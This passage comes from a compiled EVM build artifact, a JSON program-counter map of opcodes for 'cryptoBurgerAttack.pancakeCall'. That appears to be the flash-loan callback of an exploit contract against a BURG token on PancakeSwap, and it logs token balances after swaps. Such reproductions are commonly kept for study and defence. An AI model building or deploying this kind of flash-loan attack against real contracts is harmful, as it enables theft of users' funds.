      "offset": [
        5610,
        5716
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xEDA"
    },
    "3796": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3797": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3798": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DE5"
    },
    "3801": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        5610,
        5716
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3802": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3803": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3805": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3806": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3807": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3808": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "SUB",
      "path": "0"
    },
    "3809": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3810": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "LOG1",
      "path": "0"
    },
    "3811": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5726,
        5790
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 30,
      "value": "0xF16"
    },
    "3814": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3816": {
      "op": "DUP1"
    },
    "3817": {
      "op": "MLOAD"
    },
    "3818": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3820": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "3823": {
      "op": "DUP4"
    },
    "3824": {
      "op": "CODECOPY"
    },
    "3825": {
      "op": "DUP2"
    },
    "3826": {
      "op": "MLOAD"
    },
    "3827": {
      "op": "SWAP2"
    },
    "3828": {
      "op": "MSTORE"
    },
    "3829": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3831": {
      "op": "DUP1"
    },
    "3832": {
      "op": "MLOAD"
    },
    "3833": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3835": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "3838": {
      "op": "DUP4"
    },
    "3839": {
      "op": "CODECOPY"
    },
    "3840": {
      "op": "DUP2"
    },
    "3841": {
      "op": "MLOAD"
    },
    "3842": {
      "op": "SWAP2"
    },
    "3843": {
      "op": "MSTORE"
    },
    "3844": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5747,
        5759
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3845": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5760,
        5761
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3847": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5747,
        5762
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3848": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5747,
        5762
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3849": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5747,
        5762
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3850": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5747,
        5762
      ],
      "op": "LT",
      "path": "0"
    },
    "3851": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5747,
        5762
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "3854": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5747,
        5762
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3855": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5747,
        5762
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "3858": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5747,
        5762
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "3861": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        5747,
        5762
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3862": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5726,
        5790
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3863": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 31,
      "value": "0x40"
    },
    "3865": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3866": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "3871": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "3873": {
      "op": "SHL"
    },
    "3874": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3875": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3876": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3878": {
      "op": "DUP1"
    },
    "3879": {
      "op": "MLOAD"
    },
    "3880": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3882": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "3885": {
      "op": "DUP4"
    },
    "3886": {
      "op": "CODECOPY"
    },
    "3887": {
      "op": "DUP2"
    },
    "3888": {
      "op": "MLOAD"
    },
    "3889": {
      "op": "SWAP2"
    },
    "3890": {
      "op": "MSTORE"
    },
    "3891": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3892": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5865
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "3897": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5865
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3898": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xF49"
    },
    "3901": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3902": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5879,
        5894
      ],
      "op": "DUP7",
      "path": "0"
    },
    "3903": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5879,
        5894
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3904": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5908,
        5912
      ],
      "op": "DUP7",
      "path": "0"
    },
    "3905": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5908,
        5912
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3906": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "3908": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "ADD",
      "path": "0"
    },
    "3909": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "3912": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        5815,
        5922
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3913": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3914": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3916": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3918": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3919": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3920": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3921": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "SUB",
      "path": "0"
    },
    "3922": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3923": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "DUP7",
      "path": "0"
    },
    "3924": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "GAS",
      "path": "0"
    },
    "3925": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "3926": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3927": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3928": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3929": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xF66"
    },
    "3932": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3933": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3934": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3936": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3937": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3938": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3939": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3941": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3942": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3943": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "POP",
      "path": "0"
    },
    "3944": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "POP",
      "path": "0"
    },
    "3945": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "POP",
      "path": "0"
    },
    "3946": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "POP",
      "path": "0"
    },
    "3947": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3949": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3950": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3951": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3953": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3954": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3955": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3957": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3958": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3959": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3960": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "ADD",
      "path": "0"
    },
    "3961": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "3963": {
      "op": "NOT"
    },
    "3964": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "AND",
      "path": "0"
    },
    "3965": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3966": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "ADD",
      "path": "0"
    },
    "3967": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3969": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3970": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xF8E"
    },
    "3973": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3974": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3975": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3976": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "ADD",
      "path": "0"
    },
    "3977": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3978": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "3981": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        5815,
        5922
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3982": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5815,
        5922
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3983": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5800,
        5922
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3984": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5800,
        5922
      ],
      "op": "POP",
      "path": "0"
    },
    "3985": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3987": {
      "op": "DUP1"
    },
    "3988": {
      "op": "MLOAD"
    },
    "3989": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3991": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "3994": {
      "op": "DUP4"
    },
    "3995": {
      "op": "CODECOPY"
    },
    "3996": {
      "op": "DUP2"
    },
    "3997": {
      "op": "MLOAD"
    },
    "3998": {
      "op": "SWAP2"
    },
    "3999": {
      "op": "MSTORE"
    },
    "4000": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6042
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 32
    },
    "4001": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6043,
        6044
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4003": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4004": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4005": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4006": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "LT",
      "path": "0"
    },
    "4007": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xFB2"
    },
    "4010": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4011": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xFB2"
    },
    "4014": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "4017": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6030,
        6045
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4018": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4019": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "4021": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "MUL",
      "path": "0"
    },
    "4022": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "4024": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "ADD",
      "path": "0"
    },
    "4025": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "ADD",
      "path": "0"
    },
    "4026": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6030,
        6045
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4027": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5937,
        6055
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4029": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5937,
        6055
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4030": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5937,
        6055
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1015"
    },
    "4033": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5937,
        6055
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4034": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5937,
        6055
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4035": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "4037": {
      "op": "DUP1"
    },
    "4038": {
      "op": "DUP3"
    },
    "4039": {
      "op": "MSTORE"
    },
    "4040": {
      "op": "PUSH1",
      "value": "0x3C"
    },
    "4042": {
      "op": "SWAP1"
    },
    "4043": {
      "op": "DUP3"
    },
    "4044": {
      "op": "ADD"
    },
    "4045": {
      "op": "MSTORE"
    },
    "4046": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4048": {
      "op": "DUP1"
    },
    "4049": {
      "op": "MLOAD"
    },
    "4050": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4052": {
      "op": "PUSH2",
      "value": "0x2FDE"
    },
    "4055": {
      "op": "DUP4"
    },
    "4056": {
      "op": "CODECOPY"
    },
    "4057": {
      "op": "DUP2"
    },
    "4058": {
      "op": "MLOAD"
    },
    "4059": {
      "op": "SWAP2"
    },
    "4060": {
      "op": "MSTORE"
    },
    "4061": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "4063": {
      "op": "DUP3"
    },
    "4064": {
      "op": "ADD"
    },
    "4065": {
      "op": "MSTORE"
    },
    "4066": {
      "op": "PUSH32",
      "value": "0x204255524720746F6B656E2061667465722036746820737761703A2000000000"
    },
    "4099": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "4101": {
      "op": "DUP3"
    },
    "4102": {
      "op": "ADD"
    },
    "4103": {
      "op": "MSTORE"
    },
    "4104": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4106": {
      "op": "DUP2"
    },
    "4107": {
      "op": "ADD"
    },
    "4108": {
      "op": "SWAP2"
    },
    "4109": {
      "op": "SWAP1"
    },
    "4110": {
      "op": "SWAP2"
    },
    "4111": {
      "op": "MSTORE"
    },
    "4112": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "4114": {
      "op": "ADD"
    },
    "4115": {
      "op": "SWAP1"
    },
    "4116": {
      "op": "JUMP"
    },
    "4117": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5937,
        6055
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4118": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5937,
        6055
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4120": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5937,
        6055
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4121": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5937,
        6055
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4122": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5937,
        6055
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4123": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5937,
        6055
      ],
      "op": "SUB",
      "path": "0"
    },
    "4124": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5937,
        6055
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4125": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5937,
        6055
      ],
      "op": "LOG1",
      "path": "0"
    },
    "4126": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6142
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 33,
      "value": "0x0"
    },
    "4128": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6142
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "4129": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4131": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4132": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "4137": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "4139": {
      "op": "SHL"
    },
    "4140": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4141": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4142": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6161,
        6165
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "4143": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "4145": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4146": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "ADD",
      "path": "0"
    },
    "4147": {
      "op": "MSTORE"
    },
    "4148": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4150": {
      "op": "DUP1"
    },
    "4151": {
      "op": "MLOAD"
    },
    "4152": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4154": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "4157": {
      "op": "DUP4"
    },
    "4158": {
      "op": "CODECOPY"
    },
    "4159": {
      "op": "DUP2"
    },
    "4160": {
      "op": "MLOAD"
    },
    "4161": {
      "op": "SWAP2"
    },
    "4162": {
      "op": "MSTORE"
    },
    "4163": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4164": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4166": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4168": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "4170": {
      "op": "SHL"
    },
    "4171": {
      "op": "SUB"
    },
    "4172": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6142
      ],
      "op": "AND",
      "path": "0"
    },
    "4173": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6142
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4174": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6152
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "4179": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6152
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4180": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "4182": {
      "op": "ADD"
    },
    "4183": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "4185": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4187": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4188": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4189": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "DUP4",
      "path": "0"
    },
    "4190": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "SUB",
      "path": "0"
    },
    "4191": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4192": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "DUP7",
      "path": "0"
    },
    "4193": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "GAS",
      "path": "0"
    },
    "4194": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "4195": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4196": {
